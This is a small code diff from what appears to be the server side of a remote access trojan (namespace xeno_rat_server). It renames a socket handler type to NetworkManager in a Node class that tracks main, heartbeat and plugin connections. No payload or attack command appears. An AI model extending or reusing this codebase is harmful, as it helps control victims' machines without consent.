@@ -21,12 +21,12 @@ namespace xeno_rat_server
         private List<Action<Node>> TempHandleServiceStops = new List<Action<Node>>();
         public List<Node> serviceConnections;
         private Dictionary<int, Node> subNodeWait;
-        public SocketHandler sock;
+        public NetworkManager sock;
         public Node Parent;
         public int ID = -1;
         public int SubNodeIdCount = 0;
         public int connectionType = 0;//0 = main, 1 = heartbeat, 2 = anything else
-        public Node(SocketHandler _sock, Action<Node> _HandleServiceStop)
+        public Node(NetworkManager _sock, Action<Node> _HandleServiceStop)
         {
             sock = _sock;
             serviceConnections = new List<Node>();//make it only initiate if non-plugin/heartbeat
